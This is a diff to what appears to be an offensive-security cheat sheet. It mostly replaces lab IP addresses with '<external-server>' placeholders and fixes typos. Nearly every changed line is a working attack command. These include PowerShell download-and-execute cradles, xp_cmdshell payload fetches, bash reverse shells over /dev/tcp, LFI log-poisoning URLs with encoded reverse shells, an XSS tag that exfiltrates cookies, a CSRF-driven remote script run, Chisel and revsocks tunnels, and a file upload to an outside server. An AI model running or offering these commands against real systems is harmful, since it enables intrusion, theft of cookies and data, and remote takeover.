@@ -107,7 +107,7 @@ PS > powershell -NoP IEX (New-Object Net.WebClient).DownloadString('powershell_a
 ## Listeners
 
 ```shell
-root@kali:$ {nc.tradentional|nc|ncat|netcat} [-6] -lvnp <LPORT>
+root@kali:$ {nc.traditional|nc|ncat|netcat} [-6] -lvnp <LPORT>
 ```
 
 ### pwncat
@@ -333,7 +333,7 @@ $ sudo ./Responder.py -I eth0 -wfrdv
 
 ```
 $ curl -L https://github.com/Kevin-Robertson/Inveigh/raw/master/Inveigh.ps1 > inveigh.ps1
-PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y –NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
+PS > Invoke-Inveigh [-IP '127.0.0.1'] -ConsoleOutput Y -FileOutput Y –NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
 ```
 
 
@@ -1722,23 +1722,23 @@ root@kali:$ md5sum chisel.exe
 
 root@kali:$ ./chisel server -p 8000 -v --reverse
 
-PS > (new-object net.webclient).downloadfile("http://10.10.13.37/chisel.exe", "$env:userprofile\music\chisel.exe")
+PS > (new-object net.webclient).downloadfile("http://<external-server>/chisel.exe", "$env:userprofile\music\chisel.exe")
 PS > get-filehash -alg md5 chisel.exe
-PS > Start-Process -NoNewWindows chisel.exe client 10.10.13.37:8000 R:127.0.0.1:2222:127.0.0.1:1111
+PS > Start-Process -NoNewWindows chisel.exe client <external-server>:8000 R:127.0.0.1:2222:127.0.0.1:1111
 ```
 
 Socks5 proxy with Chisel in server mode:
 
 ```
 1. user@victim:$ ./chisel server -p 8000 --socks5 &
-2. root@kali:$ ./chisel client 10.10.13.38:8000 socks
+2. root@kali:$ ./chisel client <external-server>:8000 socks
 ```
 
 Socks5 proxy with Chisel in server mode when direct connection to server is not available (not relevant as Chisel now supports socks5 in client mode):
 
 ```
 1. root@kali:$ ./chisel server -p 8000 --reverse
-2. user@victim:$ ./chisel client 10.10.13.37:8000 R:127.0.0.1:8001:127.0.0.1:8002 &
+2. user@victim:$ ./chisel client <external-server>:8000 R:127.0.0.1:8001:127.0.0.1:8002 &
 3. user@victim:$ ./chisel server -v -p 8002 --socks5 &
 4. root@kali:$ ./chisel client 127.0.0.1:8001 1080:socks
 ```
@@ -1747,7 +1747,7 @@ Socks5 proxy with Chisel in client mode:
 
 ```
 1. root@kali:$ ./chisel server -p 8000 --reverse --socks5
-2. user@victim:$ ./chisel client 10.10.13.37:8000 R:socks
+2. user@victim:$ ./chisel client <external-server>:8000 R:socks
 ```
 
 
@@ -1759,7 +1759,7 @@ Socks5 proxy with Chisel in client mode:
 
 ```
 1. root@kali:$ ./revsocks -listen :8000 -socks 127.0.0.1:1080 -pass 'P@ssw0rd123'
-2. user@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'P@ssw0rd123'
+2. user@victim:$ ./revsocks -connect <internal-server>:8000 -pass 'P@ssw0rd123'
 ```
 
 
@@ -1855,7 +1855,7 @@ $ curl https://github.com/whotwagner/logrotten/raw/master/logrotten.c > lr.c
 $ gcc lr.c -o lr
 
 $ cat payloadfile
-if [ `id -u` -eq 0 ]; then (bash -c 'bash -i >& /dev/tcp/10.10.15.171/9001 0>&1' &); fi
+if [ `id -u` -eq 0 ]; then (bash -c 'bash -i >& /dev/tcp/<external-server>/9001 0>&1' &); fi
 
 $ ./lr -p ./payload -t /home/j1v37u2k3y/backups/access.log -d
 ```
@@ -1894,8 +1894,8 @@ PAM MOTD:
 
 PowerShell history:
 
-```
-PS > Get-Content C:\Users\j1v37u2k3y\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```powershell
+PS > Get-Content C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
 
@@ -2078,7 +2078,7 @@ PS > Invoke-Command -ScriptBlock { whoami } -Session $s
 Start-Process with `-Credential`
 
 ```
-PS > Start-Process -FilePath "cmd" -ArgumentList "/c ping -n 1 10.10.13.37" -Credential $cred
+PS > Start-Process -FilePath "cmd" -ArgumentList "/c ping -n 1 <external-server>" -Credential $cred
 ```
 
 
@@ -2190,7 +2190,6 @@ $ git clone https://github.com/quentinhardy/odat ~/tools/odat && cd ~/tools/odat
 $ git submodule init && git submodule update
 $ sudo apt install libaio1 python3-dev alien python3-pip
 $ wget https://download.oracle.com/otn_software/linux/instantclient/19600/oracle-instantclient19.6-basic-19.6.0.0.0-1.x86_64.rpm
-$ wget https://download.oracle.com/otn_software/linux/instantclient/19600/oracle-instantclient19.6-devel-19.6.0.0.0-1.x86_64.rpm
 $ sudo alien --to-deb *.rpm
 $ sudo dpkg -i *.deb
 $ vi /etc/profile
@@ -2241,7 +2240,7 @@ $ python3 odat.py tnspoison -s 127.0.0.1 -d CLREXTPROC --test-module
 
 ```
 root@kali:$ sqsh -S 127.0.0.1 -U 'MEGACORP\j1v37u2k3y' -P 'P@ssw0rd123'
-1> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.234/shell.ps1')"
+1> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://<external-server>/shell.ps1')"
 2> GO
 ```
 
@@ -2251,7 +2250,7 @@ root@kali:$ sqsh -S 127.0.0.1 -U 'MEGACORP\j1v37u2k3y' -P 'P@ssw0rd123'
 
 ```
 root@kali:$ mssqlclient.py MEGACORP/j1v37u2k3y:'P@ssw0rd123'@127.0.0.1 [-windows-auth]
-SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.234/shell.ps1\")"
+SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString(\"http://<external-server>/shell.ps1\")"
 ```
 
 
@@ -2408,18 +2407,18 @@ Access log (needs single `'` instead of double `"`):
 root@kali:$ nc 127.0.0.1 80
 GET /<?php system($_GET['cmd']); ?>
 
-root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//access.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//access.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<external-server>%2F1337%200%3E%261%27'
 Or
-root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//1&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//1&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<external-server>%2F1337%200%3E%261%27'
 ```
 
 Error log:
 
 ```
 root@kali:$ curl -X POST 'http://127.0.0.1/vuln1.php' --form "userfile=@docx/sample.docx" --form 'submit=Generate pdf' --referer 'http://nowhere.com/<?php system($_GET["cmd"]); ?>'
-root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//error.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//error.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<external-server>%2F1337%200%3E%261%27'
 Or
-root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//2&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//2&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<external-server>%2F1337%200%3E%261%27'
 ```
 
 
@@ -2540,7 +2539,7 @@ id=1' UNION ALL SELECT LOAD_FILE('c:\\xampp\\htdocs\\admin\\db.php'),2,3-- -
 Img tag:
 
 ```
-<img src="x" onerror="this.src='http://10.10.15.123/?c='+btoa(document.cookie)">
+<img src="x" onerror="this.src='http://<external-server>/?c='+btoa(document.cookie)">
 ```
 
 Fetch:
@@ -2591,7 +2590,7 @@ if (window.XMLHttpRequest) {
 }
 xhr.open("POST", "/backdoor.php");
 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-xhr.send("cmd=powershell -nop -exec bypass -f  \\\\10.10.15.123\\share\\rev.ps1");
+xhr.send("cmd=powershell -nop -exec bypass -f  \\\\<external-server>\\share\\rev.ps1");
 ```
 
 With capturing CSRF token first:
@@ -3474,16 +3473,16 @@ PowerShell ping sweep:
 echo "[*] Scanning in progress...";1..254 |ForEach-Object {Get-WmiObject Win32_PingStatus -Filter "Address='10.10.100.$_' and Timeout=50 and ResolveAddressNames='false' and StatusCode=0" |select ProtocolAddress* |Out-File -Append -FilePath .\live_hosts.txt};echo "[+] Live hosts:"; Get-Content -Path .\live_hosts.txt | ? { $_ -match "10.10.100" }; echo "[*] Done.";del .\live_hosts.txt
 ```
 
-PowerShell auto detect proxy, download file from remote HTTP server and run it:
+PowerShell auto-detect proxy, download file from remote HTTP server and run it:
 
 ```
-$proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").ProxyServer;$proxy=New-Object System.Net.WebProxy;$proxy.Address=$proxyAddr;$proxy.useDefaultCredentials=$true;$client=New-Object System.Net.WebClient;$client.Proxy=$proxy;$client.DownloadFile("http://10.10.13.37/met.exe","$env:userprofile\music\met.exe");$exec=New-Object -com shell.application;$exec.shellexecute("$env:userprofile\music\met.exe")
+$proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").ProxyServer;$proxy=New-Object System.Net.WebProxy;$proxy.Address=$proxyAddr;$proxy.useDefaultCredentials=$true;$client=New-Object System.Net.WebClient;$client.Proxy=$proxy;$client.DownloadFile("http://<external-server>/met.exe","$env:userprofile\music\met.exe");$exec=New-Object -com shell.application;$exec.shellexecute("$env:userprofile\music\met.exe")
 ```
 
-PowerShell manually set proxy and upload file to remote HTTP server:
+PowerShell manually set proxy and upload a file to a remote HTTP server:
 
 ```
-$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.megacorp.local:3128",$true);$creds=New-Object Net.NetworkCredential('j1v37u2k3y','P@ssw0rd123','megacorp.local');$creds=$creds.GetCredential("http://proxy.megacorp.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
+$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.megacorp.local:3128",$true);$creds=New-Object Net.NetworkCredential('j1v37u2k3y','P@ssw0rd123','megacorp.local');$creds=$creds.GetCredential("http://proxy.megacorp.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://<external-server>/results.txt","results.txt")
 ```
 
 
